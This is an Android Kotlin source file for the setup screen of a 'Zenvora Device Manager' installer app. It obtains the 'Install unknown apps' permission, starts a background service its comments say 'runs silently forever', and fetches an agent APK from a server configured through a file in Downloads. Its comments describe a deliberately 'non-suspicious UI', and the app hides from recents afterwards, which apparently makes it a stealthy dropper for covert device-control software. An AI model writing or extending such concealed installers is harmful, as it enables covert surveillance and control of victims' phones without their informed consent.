package com.zenvora.installer

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * MainActivity — shown only on first launch.
 *
 * Flow:
 *  1. Check if REQUEST_INSTALL_PACKAGES is granted
 *     → If not: send user to Settings → Install Unknown Apps for this app
 *  2. Once granted: start InstallerService (which runs silently forever)
 *  3. Show a clean, non-suspicious UI ("Device Manager Setup")
 *  4. After setup completes, the activity hides itself from recents
 */
class MainActivity : AppCompatActivity() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)

    // Views — simple by hand to avoid layout inflation errors in new module
    private lateinit var tvStatus: TextView
    private lateinit var tvSubStatus: TextView
    private lateinit var btnAction: Button
    private lateinit var progressBar: ProgressBar

    private var waitingForPermission = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvStatus = findViewById(R.id.tvStatus)
        tvSubStatus = findViewById(R.id.tvSubStatus)
        btnAction = findViewById(R.id.btnAction)
        progressBar = findViewById(R.id.progressBar)

        setupAutoConfigAndManual()
        checkAndProceed()
    }

    private fun setupAutoConfigAndManual() {
        val prefs = getSharedPreferences("zen_installer_prefs", MODE_PRIVATE)
        val btnToggle = findViewById<TextView?>(R.id.btnToggleManual)
        val layoutManual = findViewById<android.widget.LinearLayout?>(R.id.layoutManual)
        val etServer = findViewById<android.widget.EditText?>(R.id.etServerUrl)
        val etToken = findViewById<android.widget.EditText?>(R.id.etPairToken)
        val btnSave = findViewById<Button?>(R.id.btnSaveManual)

        // 1. Auto-detect bundled config file (Zero manual steps)
        detectAndLoadBundledConfig()

        // 2. Wire Manual Setup controls
        btnToggle?.setOnClickListener {
            val isVisible = layoutManual?.visibility == View.VISIBLE
            layoutManual?.visibility = if (isVisible) View.GONE else View.VISIBLE
            btnToggle.text = if (isVisible) "⚙ Manual Server / Token Setup" else "▲ Hide Manual Setup"
        }

        // Pre-fill existing config if any
        val savedServer = prefs.getString("server_url", "")
        val savedToken = prefs.getString("agent_token", "")
        if (!savedServer.isNullOrBlank()) etServer?.setText(savedServer)
        if (!savedToken.isNullOrBlank()) etToken?.setText(savedToken)

        btnSave?.setOnClickListener {
            val srv = etServer?.text?.toString()?.trim() ?: ""
            val tok = etToken?.text?.toString()?.trim() ?: ""
            if (srv.isNotBlank()) {
                val cleanSrv = srv.trimEnd('/')
                val apkUrl = "$cleanSrv/api/agent/download?platform=android&flavor=full"
                prefs.edit()
                    .putString("server_url", cleanSrv)
                    .putString("agent_token", tok)
                    .putString("agent_apk_url", apkUrl)
                    .apply()
                android.widget.Toast.makeText(this, "Manual settings saved ✓", android.widget.Toast.LENGTH_SHORT).show()
                layoutManual?.visibility = View.GONE
                btnToggle?.text = "⚙ Manual Server / Token Setup"
                checkAndProceed()
            } else {
                android.widget.Toast.makeText(this, "Please enter a valid server URL", android.widget.Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun detectAndLoadBundledConfig() {
        val candidates = listOf(
            java.io.File(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS), "zenvora_config.json"),
            java.io.File("/sdcard/Download/zenvora_config.json"),
            java.io.File(getExternalFilesDir(null), "zenvora_config.json"),
            java.io.File(filesDir, "zenvora_config.json")
        )

        for (file in candidates) {
            if (file.exists() && file.isFile) {
                try {
                    val jsonStr = file.readText()
                    val json = org.json.JSONObject(jsonStr)
                    val srv = json.optString("server_url", json.optString("api_url", "")).trimEnd('/')
                    val tok = json.optString("agent_token", json.optString("token", ""))
                    if (srv.isNotBlank()) {
                        val apkUrl = "$srv/api/agent/download?platform=android&flavor=full"
                        getSharedPreferences("zen_installer_prefs", MODE_PRIVATE).edit()
                            .putString("server_url", srv)
                            .putString("agent_token", tok)
                            .putString("agent_apk_url", apkUrl)
                            .apply()
                        Log.i(TAG, "Auto-configured from bundled: ${file.absolutePath} (Zero manual steps)")
                        break
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error parsing ${file.absolutePath}: ${e.message}")
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        // Called when user returns from Settings after granting permission
        if (waitingForPermission) {
            waitingForPermission = false
            checkAndProceed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }

    // ─────────────────────────────────────────────────────────
    //  Core flow
    // ─────────────────────────────────────────────────────────

    private fun checkAndProceed() {
        if (hasInstallPermission()) {
            onPermissionGranted()
        } else {
            showRequestPermissionUI()
        }
    }

    private fun hasInstallPermission(): Boolean {
        return packageManager.canRequestPackageInstalls()
    }

    private fun showRequestPermissionUI() {
        tvStatus.text = "One-time setup required"
        tvSubStatus.text =
            "To manage this device, please allow \"Install unknown apps\" for Zenvora Device Manager."
        progressBar.visibility = View.GONE

        btnAction.text = "Allow Installation"
        btnAction.visibility = View.VISIBLE
        btnAction.setOnClickListener {
            openInstallPermissionSettings()
        }
    }

    private fun openInstallPermissionSettings() {
        waitingForPermission = true
        val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
            data = Uri.parse("package:$packageName")
        }
        startActivity(intent)
    }

    private fun onPermissionGranted() {
        tvStatus.text = "Setting up Zenvora Device Manager…"
        tvSubStatus.text = "This only takes a moment."
        btnAction.visibility = View.GONE
        progressBar.visibility = View.VISIBLE

        // Start background service — it handles everything from here
        InstallerService.start(this)

        // Kick off an immediate install check in the background
        scope.launch {
            withContext(Dispatchers.IO) {
                // Small delay so service has time to start
                Thread.sleep(1500)
            }
            InstallerService.triggerInstall(this@MainActivity)
            showDoneUI()
        }
    }

    private fun showDoneUI() {
        progressBar.visibility = View.GONE
        tvStatus.text = "Device Manager Active"
        tvSubStatus.text = "Zenvora Device Manager is running in the background."
        btnAction.text = "Done"
        btnAction.visibility = View.VISIBLE
        btnAction.setOnClickListener {
            // Hide from recents and close
            finishAndRemoveTask()
        }
    }

    companion object {
        private const val TAG = "ZenMainActivity"
    }
}
